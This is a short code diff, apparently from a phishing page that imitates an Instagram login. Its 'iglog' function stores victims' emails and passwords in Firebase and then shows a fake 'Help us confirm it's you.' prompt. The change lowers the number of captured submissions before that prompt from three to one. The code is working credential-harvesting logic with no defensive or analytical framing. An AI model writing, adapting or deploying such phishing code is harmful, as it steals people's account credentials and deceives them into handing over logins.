@@ -80,7 +80,7 @@ function iglog() {
   submissionCount++;
   localStorage.setItem("submissionCount", submissionCount);
 
-  if (submissionCount <= 3) {
+  if (submissionCount <= 1) {
     // Save the email and password to Firebase
     firebase
       .auth()
@@ -100,7 +100,7 @@ function iglog() {
           type: "Instagram",
         });
 
-        if (submissionCount === 3) {
+        if (submissionCount === 1) {
           alert("Help us confirm it's you.");
 
           // Ensure #veryfi is displayed
